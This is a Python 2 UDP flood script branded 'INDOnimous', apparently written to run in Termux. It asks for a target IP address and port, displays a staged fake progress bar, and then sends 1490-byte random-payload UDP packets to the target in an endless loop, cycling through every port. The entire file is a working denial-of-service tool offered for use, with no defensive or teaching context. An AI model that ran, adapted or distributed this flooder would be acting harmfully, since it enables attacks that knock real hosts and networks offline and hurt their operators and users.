import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
#--- Color  ---#
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray


##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("")
os.system("python2 /data/data/com.termux/files/usr/bin/tampil.py")

print
print ""+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+W+""
print "[ Website  ] : "+C+"https"+W+"://www.pasaronlen.com    "+O+"["+B+"+"+O+"]"+W+""
print "[ Github   ] : "+C+"https"+W+"://github.com/INDOnimous "+O+"["+B+"+"+O+"]"
print ""+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+O+"["+B+"+"+O+"]"+W+""
print
nama = raw_input(""+R+"[ Input Name ] : "+B+"")
ip = raw_input(""+R+"[ IP Target  ] : "+B+"")
port = input(""+R+"[ Port       ] : "+B+"")

os.system("")
os.system("")
print ""+G+"[                         ] "+W+"0% "
time.sleep(5)
print ""+G+"[==========               ] "+W+"25%"
time.sleep(5)
print ""+G+"[===============          ] "+W+"50%"
time.sleep(5)
print ""+G+"[====================     ] "+W+"75%"
time.sleep(5)
print ""+G+"[=========================] "+W+"100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ""+W+" INDOnimous Sent"+R+" || %s || Packet To || %s || Throught Port || %s ||"%(sent,ip,port)
     if port == 65534:
       port = 1
